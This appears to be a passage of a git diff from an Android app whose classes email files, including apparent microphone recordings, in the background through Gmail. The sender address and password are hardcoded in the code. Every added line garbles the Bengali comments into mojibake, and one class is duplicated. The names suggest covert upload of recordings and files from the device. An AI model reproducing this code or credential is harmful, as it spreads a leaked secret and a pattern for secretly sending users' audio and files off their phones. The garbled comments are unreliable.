-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
-                        Log.d(TAG, "File Service Attachment added: " + new File(filePath).getName()); // লগ
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
+                        Log.d(TAG, "File Service Attachment added: " + new File(filePath).getName()); // à¦²à¦—
                     } catch (Exception e) {
-                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
+                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                         e.printStackTrace();
                     }
                 } else {
-                    Log.d(TAG, "File Service No file to attach."); // লগ
+                    Log.d(TAG, "File Service No file to attach."); // à¦²à¦—
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 try {
-                    Transport.send(mimeMessage); // মেইল পাঠানো
-                    CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                    Log.d(TAG, "File Service Email sent successfully with attachment."); // সফল লগ
+                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
+                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
+                    Log.d(TAG, "File Service Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                 } catch (MessagingException e) {
-                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // মেইল পাঠানোর ত্রুটি
+                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                     e.printStackTrace();
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // যেকোনো অপরিকল্পিত ত্রুটি
+                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
 
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         try {
-            Log.d(TAG, "File Service Sending mail with attachment to: " + email); // লগ
+            Log.d(TAG, "File Service Sending mail with attachment to: " + email); // à¦²à¦—
             JavaMailAPI_Fileservice_Sender javaMailAPI = new JavaMailAPI_Fileservice_Sender(email, subject, message, filePath);
-            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি
+            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿
             e.printStackTrace();
         }
     }
@@ -7578,114 +7644,114 @@ public class JavaMailAPI_Fileservice_Sender {
 //JavaMailAPI_MicRecord_Sender.java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
-import javax.activation.*; // অ্যাকটিভেশন
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
+import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨
 
 public class JavaMailAPI_MicRecord_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
             try {
-                // ইমেল পাঠানোর অনুমতি চেক করুন
+                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 if (!CountEmail.canSendEmail()) {
-                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                    return null; // মেইল পাঠানো হবে না
+                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                 }
 
-                // SMTP সেটিংস
+                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                 Properties props = new Properties();
-                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
+                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
 
-                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-                // সেশন তৈরি করা
+                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
 
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                     } catch (Exception e) {
-                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
+                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                         e.printStackTrace();
                     }
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 try {
-                    Transport.send(mimeMessage); // মেইল পাঠানো
-                    CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // সফল লগ
+                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
+                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
+                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                 } catch (MessagingException e) {
-                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // মেইল পাঠানোর ত্রুটি লগ
+                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                     e.printStackTrace();
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // যেকোনো অপরিকল্পিত ত্রুটি
+                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         try {
             JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
-            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি লগ
+            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
             e.printStackTrace();
         }
     }
@@ -7696,114 +7762,114 @@ public class JavaMailAPI_MicRecord_Sender {
 //JavaMailAPI_MicRecord_Sender .java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
-import javax.activation.*; // অ্যাকটিভেশন
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
+import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨
 
 public class JavaMailAPI_MicRecord_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
             try {
-                // ইমেল পাঠানোর অনুমতি চেক করুন
+                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 if (!CountEmail.canSendEmail()) {
-                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                    return null; // মেইল পাঠানো হবে না
+                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                 }
 
-                // SMTP সেটিংস
+                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                 Properties props = new Properties();
-                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
+                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
 
-                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-                // সেশন তৈরি করা
+                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
 
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                     } catch (Exception e) {
-                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
+                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                         e.printStackTrace();
                     }
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
